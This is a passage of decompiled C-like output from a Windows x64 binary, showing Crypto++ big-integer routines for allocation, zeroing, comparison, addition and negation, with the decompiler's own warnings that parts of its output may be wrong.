        v22 = v21;
        v27 = v21;
        v28 = v33;
        if ( v21 != v32 )
          sub_13F10D330(v21, 8 * v20, v32, 8 * v20);
        sub_13F113500(v7, (__int64)&v23);
        if ( v20 > 0x1FFFFFFFFFFFFFFFi64 )
          v20 = 0x1FFFFFFFFFFFFFFFi64;
        if ( v22 )
        {
          memset(v22, 0, 8 * v20);
          sub_13F12E4D0((__int64)v22);
        }
        v7 += 48i64;
        v11 += 6;
        --v12;
      }
      while ( v12 );
    }
    sub_13F113450(v30);
  }
  else
  {
    sub_13F135410(a1, a2, a3, a4, a5);
  }
}
// 13F12254F: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F1223F0: using guessed type char var_158[8];

//----- (000000013F122670) ----------------------------------------------------
__int64 __fastcall sub_13F122670(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 168i64))(*(_QWORD *)(a1 + 8));
}

//----- (000000013F122680) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F122680(__int64 a1, __int64 a2)
{
  __m128i *v4; // rax
  __int64 v5; // rbx
  __m128i *v6; // rbp
  unsigned __int64 v7; // rsi
  __int64 v8; // rdx
  __int64 v9; // rax
  __int64 *v10; // rcx
  __int64 v11; // rax
  __m128i *v12; // rcx
  __int64 (__fastcall **v14)(); // [rsp+28h] [rbp-40h] BYREF
  char v15[8]; // [rsp+30h] [rbp-38h] BYREF
  __m128i si128; // [rsp+38h] [rbp-30h]
  __m128i *v17; // [rsp+48h] [rbp-20h]
  int v18; // [rsp+50h] [rbp-18h]

  v14 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v4 = (__m128i *)sub_13F123740((__int64)v15, 2ui64);
  v17 = v4;
  v18 = 0;
  v4->m128i_i64[1] = 0i64;
  v4->m128i_i64[0] = 0i64;
  sub_13F120710((__int64)&v14, a2, a2);
  v5 = a1 + 72;
  v6 = v17;
  v7 = si128.m128i_u64[1];
  if ( (__int64 (__fastcall ***)())v5 != &v14 )
  {
    v8 = *(_QWORD *)(v5 + 24);
    if ( v8 != si128.m128i_i64[1] || !v17->m128i_i64[(unsigned __int64)si128.m128i_i64[1] >> 1] )
    {
      v9 = si128.m128i_i64[1];
      if ( si128.m128i_i64[1] )
      {
        v10 = &v17[-1].m128i_i64[si128.m128i_i64[1] + 1];
        do
        {
          if ( *v10 )
            break;
          --v10;
          --v9;
        }
        while ( v9 );
      }
      v11 = sub_13F122180((unsigned int)v9);
      sub_13F120E60((_QWORD *)(v5 + 8), v11);
      v8 = *(_QWORD *)(v5 + 24);
    }
    v12 = *(__m128i **)(v5 + 32);
    if ( v12 != v6 )
      sub_13F10D330(v12, 8 * v8, v6, 8 * v8);
    *(_DWORD *)(v5 + 40) = v18;
  }
  if ( si128.m128i_i64[0] < v7 )
    v7 = si128.m128i_i64[0];
  if ( v6 )
  {
    memset(v6, 0, 8 * v7);
    sub_13F12E4D0((__int64)v6);
  }
  return v5;
}
// 13F1226B5: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F122680: using guessed type char var_38[8];

//----- (000000013F1227E0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1227E0(__int64 a1, __int64 a2)
{
  _QWORD *v4; // rax
  __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 (__fastcall **v11)(); // [rsp+28h] [rbp-70h] BYREF
  char v12[8]; // [rsp+30h] [rbp-68h] BYREF
  __m128i si128; // [rsp+38h] [rbp-60h]
  void *v14; // [rsp+48h] [rbp-50h]
  int v15; // [rsp+50h] [rbp-48h]
  char v16[16]; // [rsp+58h] [rbp-40h] BYREF
  unsigned __int64 v17; // [rsp+68h] [rbp-30h]
  unsigned __int64 v18; // [rsp+70h] [rbp-28h]
  void *v19; // [rsp+78h] [rbp-20h]

  v11 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v4 = (_QWORD *)sub_13F123740((__int64)v12, 2ui64);
  v14 = v4;
  v15 = 0;
  v4[1] = 0i64;
  *v4 = 0i64;
  sub_13F120710((__int64)&v11, a2, a2);
  sub_13F11FD00((__int64)&v11, (__int64)v16, a1 + 24);
  v5 = sub_13F113500(a1 + 120, (__int64)v16);
  v6 = v18;
  if ( v17 < v18 )
    v6 = v17;
  v7 = (__int64)v19;
  if ( v19 )
  {
    memset(v19, 0, 8 * v6);
    sub_13F12E4D0(v7);
  }
  v8 = si128.m128i_i64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v8 = si128.m128i_i64[0];
  v9 = (__int64)v14;
  if ( v14 )
  {
    memset(v14, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  return v5;
}
// 13F122814: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1227E0: using guessed type char var_68[8];

//----- (000000013F122910) ----------------------------------------------------
__int64 __fastcall sub_13F122910(__int64 a1, __int64 a2)
{
  unsigned __int64 v2; // rbp
  unsigned __int64 *v4; // rsi
  __m128i *v6; // r15
  unsigned __int64 *v7; // r14
  __int64 v8; // rdi

  v2 = *(_QWORD *)(a1 + 48);
  v4 = *(unsigned __int64 **)(a1 + 240);
  v6 = *(__m128i **)(a1 + 104);
  v7 = &v4[2 * v2];
  sub_13F121F90(v4, v7, *(unsigned __int64 **)(a2 + 32), *(_QWORD *)(a2 + 24));
  v8 = *(_QWORD *)(a2 + 24);
  if ( 2 * (v2 - v8) )
    memset(&v4[2 * v8], 0, 16 * (v2 - v8));
  sub_13F120000(v6, v7, v4, *(unsigned __int64 **)(a1 + 56), *(unsigned __int64 **)(a1 + 200), v2);
  return a1 + 72;
}

//----- (000000013F1229C0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1229C0(__int64 a1, __int64 a2)
{
  __int64 v3; // rsi
  unsigned int v4; // er15
  _QWORD *v5; // rdi
  __int64 v6; // rax
  _QWORD *v7; // rcx
  unsigned __int64 v8; // rdi
  __m128i *v9; // rbx
  unsigned __int64 v10; // rdx
  const __m128i *v11; // r10
  unsigned __int64 v12; // rdx
  __int64 *v13; // rax
  __int64 v14; // rdx
  __m128i *v15; // rax
  _QWORD *v16; // rax
  int v17; // er15
  unsigned __int64 v18; // rcx
  __int64 v19; // rdx
  unsigned __int64 v20; // rcx
  unsigned __int64 v21; // r13
  __int64 v22; // rdi
  __m128i *v23; // rax
  __int64 (__fastcall ***v24)(); // r8
  __int64 (__fastcall ***v25)(); // rdx
  unsigned __int64 v26; // r12
  __int64 v27; // rax
  __m128i *v28; // r14
  __int64 *v29; // rcx
  __int64 v30; // rax
  __m128i *v31; // rax
  __int64 v32; // rdi
  __int64 v33; // rcx
  _QWORD *v34; // rax
  unsigned __int64 v35; // rbx
  __m128i *v36; // rax
  __m128i *v37; // rsi
  int v38; // er15
  const __m128i *v39; // r8
  unsigned __int64 v40; // rcx
  __int64 v41; // rdx
  unsigned __int64 v42; // rcx
  __int64 *v43; // rax
  __int64 v44; // rax
  __int64 v45; // r8
  unsigned __int64 v46; // rax
  __int64 *v47; // rcx
  unsigned __int64 v48; // rsi
  unsigned __int64 v49; // rcx
  __int64 *v50; // rdi
  int v51; // edi
  __int64 v52; // rcx
  __int64 *v53; // rax
  signed __int64 v54; // r9
  unsigned __int64 v55; // rax
  __int64 *v56; // rcx
  unsigned __int64 v57; // rcx
  __int64 *v58; // rdi
  __int64 v59; // rcx
  __int64 *v60; // rax
  unsigned __int64 v61; // rdi
  unsigned __int64 v62; // rcx
  __m128i *v63; // rdx
  char v65[8]; // [rsp+28h] [rbp-D8h] BYREF
  __int64 v66; // [rsp+30h] [rbp-D0h] BYREF
  unsigned __int64 v67; // [rsp+38h] [rbp-C8h]
  unsigned __int64 v68; // [rsp+40h] [rbp-C0h]
  __m128i *v69; // [rsp+48h] [rbp-B8h]
  int v70; // [rsp+50h] [rbp-B0h]
  __int64 (__fastcall **v71)(); // [rsp+58h] [rbp-A8h] BYREF
  __int64 v72; // [rsp+60h] [rbp-A0h] BYREF
  unsigned __int64 v73; // [rsp+68h] [rbp-98h]
  unsigned __int64 v74; // [rsp+70h] [rbp-90h]
  __m128i *v75; // [rsp+78h] [rbp-88h]
  int v76; // [rsp+80h] [rbp-80h]
  __int64 (__fastcall **v77)(); // [rsp+88h] [rbp-78h] BYREF
  char v78[8]; // [rsp+90h] [rbp-70h] BYREF
  unsigned __int64 v79; // [rsp+98h] [rbp-68h]
  unsigned __int64 v80; // [rsp+A0h] [rbp-60h]
  __m128i *v81; // [rsp+A8h] [rbp-58h]
  int v82; // [rsp+B0h] [rbp-50h]
  __int64 (__fastcall **v83)(); // [rsp+B8h] [rbp-48h] BYREF
  char v84[8]; // [rsp+C0h] [rbp-40h] BYREF
  unsigned __int64 v85; // [rsp+C8h] [rbp-38h]
  unsigned __int64 v86; // [rsp+D0h] [rbp-30h]
  void *v87; // [rsp+D8h] [rbp-28h]
  int v88; // [rsp+E0h] [rbp-20h]
  __int64 (__fastcall **v89)(); // [rsp+E8h] [rbp-18h] BYREF
  char v90[8]; // [rsp+F0h] [rbp-10h] BYREF
  unsigned __int64 v91; // [rsp+F8h] [rbp-8h]
  __int64 v92; // [rsp+100h] [rbp+0h]
  __m128i *v93; // [rsp+108h] [rbp+8h]
  int v94; // [rsp+110h] [rbp+10h]
  __int64 v95; // [rsp+118h] [rbp+18h]
  __int64 (__fastcall **v96)(); // [rsp+120h] [rbp+20h]
  char v97[8]; // [rsp+128h] [rbp+28h] BYREF
  __int64 v98; // [rsp+130h] [rbp+30h]
  unsigned __int64 v99; // [rsp+138h] [rbp+38h]
  __m128i *v100; // [rsp+140h] [rbp+40h]
  int v101; // [rsp+148h] [rbp+48h]
  unsigned int v104; // [rsp+1B0h] [rbp+B0h]
  int v105; // [rsp+1B0h] [rbp+B0h]
  unsigned __int64 v106; // [rsp+1B8h] [rbp+B8h]

  v95 = -2i64;
  v3 = a1;
  v4 = 0;
  if ( *(_DWORD *)(a1 + 40) == 1 )
    goto LABEL_125;
  v5 = *(_QWORD **)(a1 + 32);
  if ( !*v5 )
  {
    v6 = *(_QWORD *)(a1 + 24);
    if ( v6 )
    {
      v7 = &v5[v6 - 1];
      do
      {
        if ( *v7 )
          break;
        --v7;
        --v6;
      }
      while ( v6 );
    }
    if ( !(_DWORD)v6 )
    {
LABEL_125:
      sub_13F112A00(a2, (__int64)&off_13F1C4398);
      return a2;
    }
  }
  v71 = off_13F185278;
  v73 = 0x1FFFFFFFFFFFFFFFi64;
  v8 = 2i64;
  v74 = 2i64;
  v9 = (__m128i *)sub_13F123740((__int64)&v72, 2ui64);
  v75 = v9;
  v76 = 0;
  v9->m128i_i64[1] = 0i64;
  v9->m128i_i64[0] = 0i64;
  v10 = (unsigned __int64)((unsigned int)sub_13F11BFE0(v3) + 1) >> 1;
  sub_13F1215D0((__int64)v65, v10);
  v11 = v69;
  v12 = v68;
  while ( 1 )
  {
    if ( v8 != v12 || !v11->m128i_i64[v12 >> 1] )
    {
      if ( v12 )
      {
        v13 = &v11->m128i_i64[v12 - 1];
        do
        {
          if ( *v13 )
            break;
          --v13;
          --v12;
        }
        while ( v12 );
      }
      v14 = sub_13F122180((unsigned int)v12);
      sub_13F120E60(&v72, v14);
      v9 = v75;
      v8 = v74;
      v11 = v69;
    }
    if ( v9 != v11 )
      sub_13F10D330(v9, 8 * v8, v11, 8 * v8);
    v76 = v70;
    v77 = off_13F185278;
    v79 = 0x1FFFFFFFFFFFFFFFi64;
    v80 = 2i64;
    v15 = (__m128i *)sub_13F123740((__int64)v78, 2ui64);
    v81 = v15;
    v82 = 0;
    v15->m128i_i64[1] = 0i64;
    v15->m128i_i64[0] = 0i64;
    v83 = off_13F185278;
    v85 = 0x1FFFFFFFFFFFFFFFi64;
    v86 = 2i64;
    v16 = (_QWORD *)sub_13F123740((__int64)v84, 2ui64);
    v87 = v16;
    v88 = 0;
    v16[1] = 0i64;
    *v16 = 0i64;
    v17 = v4 | 8;
    sub_13F11CFD0((__int64)&v77, (__int64)&v83, v3, (__int64)&v71);
    v18 = v80;
    if ( v79 < v80 )
      v18 = v79;
    v19 = (__int64)v81;
    if ( v81 )
    {
      memset(v81, 0, 8 * v18);
      sub_13F12E4D0(v19);
    }
    v106 = v74;
    v20 = v74;
    v21 = v86;
    if ( v74 < v86 )
      v20 = v86;
    v89 = off_13F185278;
    v22 = sub_13F122180(v20);
    v91 = 0x1FFFFFFFFFFFFFFFi64;
    v92 = v22;
    v23 = (__m128i *)sub_13F123740((__int64)v90, v22);
    v93 = v23;
    v94 = 0;
    v23->m128i_i64[0] = 0i64;
    if ( v22 != 1 )
      memset(&v23->m128i_u64[1], 0, 8 * (v22 - 1));
    if ( v76 != 1 )
    {
      v24 = &v83;
      v25 = &v71;
      if ( v88 != 1 )
      {
        sub_13F120FA0((__int64)&v89, (__int64)&v71, (__int64)&v83);
        goto LABEL_35;
      }
      goto LABEL_33;
    }
    if ( v88 != 1 )
    {
      v24 = &v71;
      v25 = &v83;
LABEL_33:
      sub_13F1213E0((__int64)&v89, (__int64)v25, (__int64)v24);
      goto LABEL_35;
    }
    sub_13F120FA0((__int64)&v89, (__int64)&v71, (__int64)&v83);
    v94 = 1;
LABEL_35:
    v104 = v17 & 0xFFFFFFD3 | 4;
    v77 = off_13F185278;
    v26 = v92;
    v27 = v92;
    v28 = v93;
    if ( v92 )
    {
      v29 = &v93[-1].m128i_i64[v92 + 1];
      do
      {
        if ( *v29 )
          break;
        --v29;
        --v27;
      }
      while ( v27 );
    }
    v30 = sub_13F122180((unsigned int)v27);
    v79 = 0x1FFFFFFFFFFFFFFFi64;
    v80 = v30;
    v31 = (__m128i *)sub_13F123740((__int64)v78, v30);
    v81 = v31;
    v82 = v94;
    if ( v31 != v28 )
      sub_13F10D330(v31, 8 * v80, v28, 8 * v80);
    v32 = sub_13F114080((__int64)&v77, 1ui64);
    v96 = off_13F185278;
    v33 = *(_QWORD *)(v32 + 24);
    if ( v33 )
    {
      v34 = (_QWORD *)(*(_QWORD *)(v32 + 32) + 8 * (v33 - 1));
      do
      {
        if ( *v34 )
          break;
        --v34;
        --v33;
      }
      while ( v33 );
    }
    v35 = sub_13F122180((unsigned int)v33);
    v98 = 0x1FFFFFFFFFFFFFFFi64;
    v99 = v35;
    v36 = (__m128i *)sub_13F123740((__int64)v97, v35);
    v37 = v36;
    v100 = v36;
    v38 = *(_DWORD *)(v32 + 40);
    v101 = v38;
    v39 = *(const __m128i **)(v32 + 32);
    if ( v36 != v39 )
      sub_13F10D330(v36, 8 * v35, v39, 8 * v35);
    v105 = v104 | 0x50;
    v40 = v80;
    if ( v79 < v80 )
      v40 = v79;
    v41 = (__int64)v81;
    if ( v81 )
    {
      memset(v81, 0, 8 * v40);
      sub_13F12E4D0(v41);
    }
    v12 = v68;
    if ( v68 != v35 || !v37->m128i_i64[v35 >> 1] )
    {
      v42 = v35;
      if ( v35 )
      {
        v43 = &v37->m128i_i64[v35 - 1];
        do
        {
          if ( *v43 )
            break;
          --v43;
          --v42;
        }
        while ( v42 );
      }
      v44 = sub_13F122180((unsigned int)v42);
      sub_13F120E60(&v66, v44);
      v12 = v68;
    }
    v11 = v69;
    if ( v69 != v37 )
    {
      sub_13F10D330(v69, 8 * v12, v37, 8 * v12);
      v11 = v69;
      v12 = v68;
    }
    v70 = v38;
    v4 = v105 & 0xFFFFFFBF;
    if ( v35 > 0x1FFFFFFFFFFFFFFFi64 )
      v35 = 0x1FFFFFFFFFFFFFFFi64;
    if ( v37 )
    {
      memset(v37, 0, 8 * v35);
      sub_13F12E4D0((__int64)v37);
      v11 = v69;
      v12 = v68;
    }
    if ( v91 < v26 )
      v26 = v91;
    if ( v28 )
    {
      memset(v28, 0, 8 * v26);
      sub_13F12E4D0((__int64)v28);
      v11 = v69;
      v12 = v68;
    }
    if ( v85 < v21 )
      v21 = v85;
    v45 = (__int64)v87;
    if ( v87 )
    {
      memset(v87, 0, 8 * v21);
      sub_13F12E4D0(v45);
      v11 = v69;
      v12 = v68;
    }
    v9 = v75;
    if ( v70 != 1 )
      break;
    v3 = a1;
    if ( v76 == 1 )
    {
      v55 = v12;
      if ( v12 )
      {
        v56 = &v11->m128i_i64[v12 - 1];
        do
        {
          if ( *v56 )
            break;
          --v56;
          --v55;
        }
        while ( v55 );
      }
      v48 = v106;
      v57 = v106;
      if ( v106 )
      {
        v58 = &v75[-1].m128i_i64[v106 + 1];
        do
        {
          if ( *v58 )
            break;
          --v58;
          --v57;
        }
        while ( v57 );
      }
      if ( (_DWORD)v55 == (_DWORD)v57 )
      {
        v59 = (unsigned int)v55;
        if ( !(_DWORD)v55 )
        {
LABEL_91:
          v51 = 0;
          goto LABEL_92;
        }
        v60 = &v75->m128i_i64[(unsigned int)v55];
        while ( 1 )
        {
          --v59;
          v61 = *(__int64 *)((char *)--v60 + (char *)v11 - (char *)v75);
          if ( v61 > *v60 )
            break;
          if ( v61 < *v60 )
            goto LABEL_114;
          if ( !v59 )
            goto LABEL_91;
        }
LABEL_94:
        v51 = -1;
      }
      else
      {
        v51 = 1;
        if ( (unsigned int)v55 > (unsigned int)v57 )
          v51 = -1;
      }
LABEL_92:
      if ( v51 >= 0 )
        goto LABEL_116;
      v8 = v106;
      v3 = a1;
    }
    else
    {
      v8 = v106;
    }
  }
  if ( v76 != 1 )
  {
    v46 = v12;
    if ( v12 )
    {
      v47 = &v11->m128i_i64[v12 - 1];
      do
      {
        if ( *v47 )
          break;
        --v47;
        --v46;
      }
      while ( v46 );
    }
    v48 = v106;
    v49 = v106;
    if ( v106 )
    {
      v50 = &v75[-1].m128i_i64[v106 + 1];
      do
      {
        if ( *v50 )
          break;
        --v50;
        --v49;
      }
      while ( v49 );
    }
    if ( (_DWORD)v46 == (_DWORD)v49 )
    {
      v52 = (unsigned int)v46;
      if ( !(_DWORD)v46 )
        goto LABEL_91;
      v53 = &v11->m128i_i64[(unsigned int)v46];
      v54 = (char *)v75 - (char *)v11;
      while ( 1 )
      {
        --v52;
        --v53;
        if ( *v53 > *(unsigned __int64 *)((char *)v53 + v54) )
          break;
        if ( *v53 < *(unsigned __int64 *)((char *)v53 + v54) )
          goto LABEL_94;
        if ( !v52 )
          goto LABEL_91;
      }
LABEL_114:
      v51 = 1;
    }
    else
    {
      v51 = -1;
      if ( (unsigned int)v46 > (unsigned int)v49 )
        v51 = 1;
    }
    goto LABEL_92;
  }
  v48 = v106;
LABEL_116:
  sub_13F112A00(a2, (__int64)&v71);
  v62 = v68;
  if ( v67 < v68 )
    v62 = v67;
  v63 = v69;
  if ( v69 )
  {
    memset(v69, 0, 8 * v62);
    sub_13F12E4D0((__int64)v63);
  }
  if ( v73 < v48 )
    v48 = v73;
  if ( v9 )
  {
    memset(v9, 0, 8 * v48);
    sub_13F12E4D0((__int64)v9);
  }
  return a2;
}
// 13F122A45: write access to const memory at 13F1C4384 has been detected
// 13F122B63: write access to const memory at 13F1C4384 has been detected
// 13F122BB1: write access to const memory at 13F1C4384 has been detected
// 13F122C65: write access to const memory at 13F1C4384 has been detected
// 13F122D2E: write access to const memory at 13F1C4384 has been detected
// 13F122DC8: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();
// 13F1229C0: using guessed type char var_168[8];
// 13F1229C0: using guessed type char var_100[8];
// 13F1229C0: using guessed type char var_D0[8];
// 13F1229C0: using guessed type char var_A0[8];
// 13F1229C0: using guessed type char var_68[8];

//----- (000000013F1231D0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1231D0(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v6; // rcx
  __int64 v7; // rdi
  _QWORD *v8; // rax
  __int64 v9; // r8
  __int64 v10; // rdx
  __int64 result; // rax
  __int64 v12; // rbx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  __int64 (__fastcall **v15)(); // [rsp+28h] [rbp-40h] BYREF
  char v16[8]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v17; // [rsp+38h] [rbp-30h]
  unsigned __int64 v18; // [rsp+40h] [rbp-28h]
  void *v19; // [rsp+48h] [rbp-20h]
  int v20; // [rsp+50h] [rbp-18h]

  v6 = *(_QWORD *)(a2 + 24);
  if ( v6 < *(_QWORD *)(a3 + 24) )
    v6 = *(_QWORD *)(a3 + 24);
  v15 = off_13F185278;
  v7 = sub_13F122180(v6);
  v17 = 0x1FFFFFFFFFFFFFFFi64;
  v18 = v7;
  v8 = (_QWORD *)sub_13F123740((__int64)v16, v7);
  v19 = v8;
  v20 = 0;
  *v8 = 0i64;
  if ( v7 != 1 )
    memset(v8 + 1, 0, 8 * (v7 - 1));
  if ( *(_DWORD *)(a2 + 40) == 1 )
  {
    if ( *(_DWORD *)(a3 + 40) != 1 )
    {
      sub_13F120FA0((__int64)&v15, a2, a3);
      v20 = 1;
      goto LABEL_12;
    }
    v9 = a2;
    v10 = a3;
  }
  else
  {
    v9 = a3;
    v10 = a2;
    if ( *(_DWORD *)(a3 + 40) == 1 )
    {
      sub_13F120FA0((__int64)&v15, a2, a3);
      goto LABEL_12;
    }
  }
  sub_13F1213E0((__int64)&v15, v10, v9);
LABEL_12:
  result = sub_13F113500(a1 + 72, (__int64)&v15);
  v12 = result;
  v13 = v18;
  if ( v17 < v18 )
    v13 = v17;
  v14 = (__int64)v19;
  if ( v19 )
  {
    memset(v19, 0, 8 * v13);
    sub_13F12E4D0(v14);
    return v12;
  }
  return result;
}
// 13F123217: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F1231D0: using guessed type char var_38[8];

//----- (000000013F123320) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F123320(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v6; // rcx
  __int64 v7; // rax
  __int64 v9; // rdi
  _QWORD *v10; // rax
  __int64 v11; // r8
  __int64 v12; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  __int64 (__fastcall **v15)(); // [rsp+28h] [rbp-40h] BYREF
  char v16[8]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v17; // [rsp+38h] [rbp-30h]
  unsigned __int64 v18; // [rsp+40h] [rbp-28h]
  void *v19; // [rsp+48h] [rbp-20h]
  int v20; // [rsp+50h] [rbp-18h]

  v6 = *(_QWORD *)(a2 + 24);
  v7 = *(_QWORD *)(a1 + 48);
  if ( v6 == v7 && *(_QWORD *)(a3 + 24) == v7 )
  {
    if ( sub_13F13A520(v6, *(_QWORD *)(a1 + 104), *(_QWORD *)(a2 + 32), *(_QWORD *)(a3 + 32)) )
      sub_13F13A4D0(*(_QWORD *)(a2 + 24), *(_QWORD *)(a1 + 104), *(_QWORD *)(a1 + 104), *(_QWORD *)(a1 + 56));
    return a1 + 72;
  }
  if ( v6 < *(_QWORD *)(a3 + 24) )
    v6 = *(_QWORD *)(a3 + 24);
  v15 = off_13F185278;
  v9 = sub_13F122180(v6);
  v17 = 0x1FFFFFFFFFFFFFFFi64;
  v18 = v9;
  v10 = (_QWORD *)sub_13F123740((__int64)v16, v9);
  v19 = v10;
  v20 = 0;
  *v10 = 0i64;
  if ( v9 != 1 )
    memset(v10 + 1, 0, 8 * (v9 - 1));
  if ( *(_DWORD *)(a2 + 40) == 1 )
  {
    if ( *(_DWORD *)(a3 + 40) != 1 )
    {
      sub_13F120FA0((__int64)&v15, a2, a3);
      v20 = 1;
      goto LABEL_17;
    }
    v11 = a2;
    v12 = a3;
LABEL_16:
    sub_13F1213E0((__int64)&v15, v12, v11);
    goto LABEL_17;
  }
  v11 = a3;
  v12 = a2;
  if ( *(_DWORD *)(a3 + 40) != 1 )
    goto LABEL_16;
  sub_13F120FA0((__int64)&v15, a2, a3);
LABEL_17:
  sub_13F113500(a1 + 120, (__int64)&v15);
  v13 = v18;
  if ( v17 < v18 )
    v13 = v17;
  v14 = (__int64)v19;
  if ( v19 )
  {
    memset(v19, 0, 8 * v13);
    sub_13F12E4D0(v14);
  }
  if ( *(_DWORD *)(a1 + 160) == 1 )
    sub_13F113F60(a1 + 120, a1 + 24);
  return a1 + 120;
}
// 13F1233A8: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F123320: using guessed type char var_38[8];

//----- (000000013F1234D0) ----------------------------------------------------
__int64 __fastcall sub_13F1234D0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 144i64))(*(_QWORD *)(a1 + 8));
}

//----- (000000013F1234E0) ----------------------------------------------------
__int64 __fastcall sub_13F1234E0(__int64 a1, __int64 a2, __int64 a3)
{
  sub_13F112CF0(a2);
  sub_13F120710(a2, a1, a3);
  return a2;
}

//----- (000000013F123540) ----------------------------------------------------
__int64 (__fastcall *(**sub_13F123540())[4])()
{
  return &off_13F1C43F8;
}
// 13F1C43F8: using guessed type __int64 (__fastcall *(*off_13F1C43F8)[4])();

//----- (000000013F123550) ----------------------------------------------------
__int64 __fastcall sub_13F123550(unsigned __int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r8
  unsigned __int64 v5; // rax
  unsigned int v6; // er8
  __int64 v7; // r9
  unsigned __int64 v8; // rcx
  __int64 v9; // rcx
  __int64 result; // rax
  __m128i si128; // xmm1
  int v12; // er9
  __int64 v13; // rcx
  __int64 i; // rdx

  v2 = *a1;
  v5 = *a1 - 1;
  *a1 = v5;
  if ( v5 > v2 )
  {
    v6 = 1;
    if ( a2 > 1 )
    {
      v7 = 1i64;
      do
      {
        v8 = a1[v7];
        a1[v7] = v8 - 1;
        if ( v8 )
          break;
        v7 = ++v6;
      }
      while ( v6 < a2 );
    }
  }
  v9 = 0i64;
  result = 0i64;
  if ( a2 >= 8 )
  {
    si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AF0);
    v12 = 4;
    do
    {
      result = (unsigned int)(result + 8);
      *(__m128i *)&a1[v9] = _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&a1[v9]), si128);
      *(__m128i *)&a1[v12 - 2] = _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&a1[v12 - 2]), si128);
      *(__m128i *)&a1[v12] = _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&a1[v12]), si128);
      v13 = (unsigned int)(v12 + 2);
      v12 += 8;
      *(__m128i *)&a1[v13] = _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&a1[v13]), si128);
      v9 = (unsigned int)result;
    }
    while ( (unsigned int)result < (a2 & 0xFFFFFFFFFFFFFFF8ui64) );
  }
  for ( i = (unsigned int)result; (unsigned int)result < a2; i = (unsigned int)result )
  {
    a1[i] = ~a1[i];
    result = (unsigned int)(result + 1);
  }
  return result;
}
// 13F185AF0: using guessed type __int128 xmmword_13F185AF0;

//----- (000000013F123630) ----------------------------------------------------
__int64 __fastcall sub_13F123630(__int64 a1)
{
  __int64 result; // rax
  _QWORD *v2; // rcx

  result = *(_QWORD *)(a1 + 24);
  if ( result )
  {
    v2 = (_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * (result - 1));
    do
    {
      if ( *v2 )
        break;
      --v2;
      --result;
    }
    while ( result );
  }
  return result;
}

//----- (000000013F123660) ----------------------------------------------------
__int64 __fastcall sub_13F123660(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD *v7; // rcx
  __int64 v8; // rax
  _QWORD *v9; // rcx
  __int64 v11[22]; // [rsp+30h] [rbp-118h] BYREF
  char pExceptionObject[64]; // [rsp+E0h] [rbp-68h] BYREF

  if ( *(_DWORD *)(a4 + 40) != 1 )
  {
    v7 = *(_QWORD **)(a4 + 32);
    if ( !*v7 )
    {
      v8 = *(_QWORD *)(a4 + 24);
      if ( v8 )
      {
        v9 = &v7[v8 - 1];
        do
        {
          if ( *v9 )
            break;
          --v9;
          --v8;
        }
        while ( v8 );
      }
      if ( !(_DWORD)v8 )
      {
        sub_13F112880((__int64)pExceptionObject);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
      }
    }
  }
  sub_13F112E50((__int64)v11, a4);
  sub_13F1351A0((__int64)v11, a1, a2, a3);
  sub_13F113380(v11);
  return a1;
}
// 13F123660: using guessed type _QWORD var_118[22];

//----- (000000013F123740) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F123740(__int64 a1, unsigned __int64 a2)
{
  __m128i v3[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  if ( a2 > 0x1FFFFFFFFFFFFFFFi64 )
  {
    sub_13F1053B0(v3, (const __m128i *)"AllocatorBase: requested size would cause integer overflow");
    sub_13F101600((__int64)pExceptionObject, v3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( a2 )
    return sub_13F12E450(8 * a2);
  else
    return 0i64;
}
// 13F123740: using guessed type __m128i var_80[2];

//----- (000000013F1237F0) ----------------------------------------------------
